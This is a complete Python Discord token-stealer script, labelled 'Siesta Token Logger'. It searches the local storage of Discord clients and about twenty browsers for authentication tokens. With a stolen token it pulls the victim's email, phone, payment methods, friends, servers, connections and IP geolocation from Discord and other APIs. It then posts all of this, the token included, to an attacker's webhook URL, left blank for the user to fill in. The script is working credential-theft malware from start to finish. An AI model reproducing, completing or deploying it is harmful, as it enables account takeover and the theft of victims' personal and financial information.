import os
import re
import requests
import json
webhook = ""  # Input Your WEBHOOK URL Here
local = os.getenv("LOCALAPPDATA")
roaming = os.getenv("APPDATA")
paths = {
    "Discord": f"{roaming}/Discord/Local Storage/leveldb",
    "Discord Canary": f"{roaming}/DiscordCanary/Local Storage/leveldb",
    "Discord PTB": f"{roaming}/DiscordPTB/Local Storage/leveldb",
    "LigthCord": f"{roaming}/Lightcord/Local Storage/leveldb",
    "Google Chrome": f"{local}/Google/Chrome/User Data/Default/Local Storage/leveldb",
    "Opera": f"{local}/Opera Software/Opera Stable/User Data/Default/Local Storage/leveldb",
    "Opera GX": f"${local}/Opera Software/Opera GX Stable/Local Storage/leveldb",
    "Brave": f"{local}/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb",
    "Yandex": f"{local}/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb",
    "Edge": f"{local}/Microsoft/Edge/User Data/Default/Local Storage/leveldb",
    "uCoz": f"{local}/uCozMedia/Uran/User Data/Default/Local Storage/leveldb",
    "Epic": f"{local}/Epic Privacy Browser/User Data/Local Storage/leveldb",
    "SxS": f"{local}/Google/Chrome SxS/User Data/Local Storage/leveldb",
    "Vivaldi": f"{local}/Vivaldi/User Data/Default/Local Storage/leveldb",
    "Sputnik": f"{local}/Sputnik/Sputnik/User Data/Local Storage/leveldb",
    "7Star": f"{local}/7Star/7Star/User Data/Local Storage/leveldb",
    "CentBrower": f"{local}/CentBrowser/User Data/Local Storage/leveldb",
    "Orbitum": f"{local}/Orbitum/User Data/Local Storage/leveldb",
    "Kometa": f"{local}/Kometa/User Data/Local Storage/leveldb",
    "Torch": f"{local}/Torch/User Data/Local Storage/leveldb",
    "Amigo": f"{local}/Amigo/User Data/Local Storage/leveldb",
}
def grabber(path):
    token = ""
    for name in os.listdir(path):
        if not name.endswith(".ldb"): continue
        for Opened in open(f"{path}\\{name}", errors="ignore").readlines():
            for findToken in (r"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}", r"mfa\.[\d\w_-]{84}",):
                for match in re.findall(findToken, Opened):
                    token = match
    return token
def getIP():
    req = requests.get("http://ip-api.com/json/")
    return req.json()

def friendInfos(token):
    f = 0
    req = requests.get("https://discordapp.com/api/v9/users/@me/relationships", headers={"authorization": token})
    for friend in req.json():
        if friend["type"] == 1: f = f + 1
    return f

def getPayment(token):
    validPayment = ""
    req = requests.get("https://discord.com/api/v9/users/@me/billing/payment-sources", headers={"authorization": token})
    for payment in req.json():
        if payment["type"] == 1 and payment["invalid"] == False: validPayment += "<:y_card_spc:918956324908318720> "
        if payment["type"] == 2: validPayment += "<:paypal:891011558040277072> "
    if validPayment == "": validPayment = "`No`"
    return validPayment

def guildInfos(token):
    guildCount = 0
    req = requests.get("https://discord.com/api/v9/users/@me/guilds", headers={"authorization": token})
    guildCount = len(req.json())
    return guildCount

def appliInfos(token):
    appliLength = 0
    req = requests.get("https://discord.com/api/v9/applications", headers={"authorization": token})
    appliLength = len(req.json())
    return appliLength

def connectLength(token):
    connect = 0
    req = requests.get("https://discordapp.com/api/v9/users/@me/connections", headers={"authorization": token})
    connect = len(req.json())
    return connect
def getBadges(f):
    b = ""
    if ((f & 1) == 1): b += "<:staff:869411643765964921> "
    if ((f & 2) == 2): b += "<:S_badgePartnerIDK:853638010737786910> "
    if ((f & 4) == 4): b += "<:Hypesquadevents:894192746569535568> "
    if ((f & 8) == 8): b += "<:DE_BadgeBughunter:918945699503145011> "
    if ((f & 64) == 64): b += "<:bravery:889966063100493914> "
    if ((f & 128) == 128): b += "<:brilliance:889966063377317908> "
    if ((f & 256) == 256): b += "<:balance:889966062962094090> "
    if ((f & 512) == 512): b += "<:lgn_earlysupporter:905293948665360384> "
    if ((f & 16384) == 16384): b += "<:DE_BadgeBughunterCanary:918945729400147978> "
    if ((f & 131072) == 131072): b += "<:dev_bot:904823639537504286> "
    if (b == ""): b = ":x:"
    return b
def getNitro(f):
    n = ""
    if ((f & 0) == 0): n = ":x:"
    if ((f & 1) == 1): n = "<:Nitro_Yohann:901289849024282674>"
    if ((f & 2) == 2): n = "<:LNnitro:918956604987166760> <:6_boost:854202388084293642>"
    if (n == ""): n = ":x:"
    return n
for p, path in paths.items():
    if os.path.exists(path):
        token = grabber(path)
        req = requests.get("https://discord.com/api/v9/users/@me", headers={"authorization": token})
        data = req.json()
        if not "message" in data:
            if data['bio'].startswith("```") and data['bio'].endswith("```"): bio = data["bio"].replace("```", "")
            else: bio = data['bio']
            if not data["phone"]: phone = "𝗡𝗼 𝐏𝗵𝗼𝗻𝗲."
            else: phone = data["phone"]
            if data['banner']: image = f"https://cdn.discordapp.com/banners/{data['id']}/{data['banner']}.png?size=512"
            else: image = "https://thumbs.gfycat.com/DefinitiveAstonishingIchthyostega-size_restricted.gif"
            ipInfos = getIP()
            toSend = {
                "username": "𝐍𝐨𝐭 𝐅𝐮𝐛𝐮𝐤𝐢𝐢 𝐏𝐲𝐭𝐡𝐨𝐧 𝐋𝐞𝐚𝐫𝐧𝐢𝐧𝐠",
                "avatar_url": "https://cdn.discordapp.com/attachments/879823020682788907/901549246652764180/0f128f389c4ad7cfa9e44fe81ca01059.gif",
                "content": "",
                "embeds": [{
                    "fields": [{
                        "name": "𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲",
                        "value": f"```{data['username']}#{data['discriminator']}```"
                    }, {
                        "name": "𝗕𝗮𝗱𝗴𝗲𝘀",
                        "value": getBadges(data['flags']),
                        "inline": True
                    }, {
                        "name": "𝗡𝗶𝘁𝗿𝗼",
                        "value": getNitro(data["premium_type"]),
                        "inline": True
                    }, {
                        "name": "𝐅𝗿𝐢𝗲𝐧𝐝𝐬",
                        "value": f"`{friendInfos(token)}`",
                        "inline": True
                    }, {
                        "name": "𝐏𝐚𝐲𝐦𝐞𝐧𝐭 𝐌𝐞𝐭𝐡𝐨𝐝",
                        "value": getPayment(token),
                        "inline": True
                    }, {
                        "name": "𝐓𝐨𝐭𝐚𝐥 𝐆𝐮𝐢𝐥𝐝",
                        "value": f"`{guildInfos(token)}`",
                        "inline": True
                    }, {
                        "name": "𝐓𝐨𝐭𝐚𝐥 𝐀𝐩𝐩𝐥𝐢𝐜𝐚𝐭𝐢𝐨𝐧𝐬",
                        "value": f"`{appliInfos(token)}`",
                        "inline": True
                    }, {
                        "name": "𝐓𝐨𝐭𝐚𝐥 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐨𝐧𝐬",
                        "value": f"`{connectLength(token)}`",
                        "inline": True
                    }, {
                        "name": "𝗡𝗦𝗙𝗪 𝗔𝗹𝗹𝗼𝘄𝗲𝗱",
                        "value": f"`{data['nsfw_allowed']}`",
                        "inline": True
                    }, {
                        "name": "𝗩𝗲𝗿𝗶𝗳𝗶𝗲𝗱",
                        "value": f"`{data['verified']}`",
                        "inline": True
                    }, {
                        "name": "𝗕𝗶𝗼𝗴𝗿𝗮𝗽𝗵𝗶𝗲",
                        "value": f"```{bio}```"
                    }, {
                        "name": "𝗘𝗺𝗮𝗶𝗹",
                        "value": f"```{data['email']}```"
                    }, {
                        "name": "𝗣𝗵𝗼𝗻𝗲",
                        "value": f"```{phone}```"
                    }, {
                        "name": "𝗧𝗼𝗸𝗲𝗻",
                        "value": f"```{token}```"
                    }, {
                        "name": "𝐈𝐏 𝐈𝐧𝐟𝐨𝐬",
                        "value": f"```{ipInfos['country']} | {ipInfos['regionName']}\n{ipInfos['city']} | {ipInfos['isp']}\n{ipInfos['query']}```"
                    }],
                    "image": {
                        "url": image
                    },
                    "footer": {
                        "text": "𝐒𝐢𝐞𝐬𝐭𝐚 𝐓𝐨𝐤𝐞𝐧 𝐋𝐨𝐠𝐠𝐞𝐫"
                    },
                    "thumbnail": {
                        "url": f"https://cdn.discordapp.com/avatars/{data['id']}/{data['avatar']}.gif?size=128"
                    },
                    "color": 43690
                }]
            }
            requests.post(webhook, data = json.dumps(toSend).encode(), headers = {'Content-Type': "application/json"})
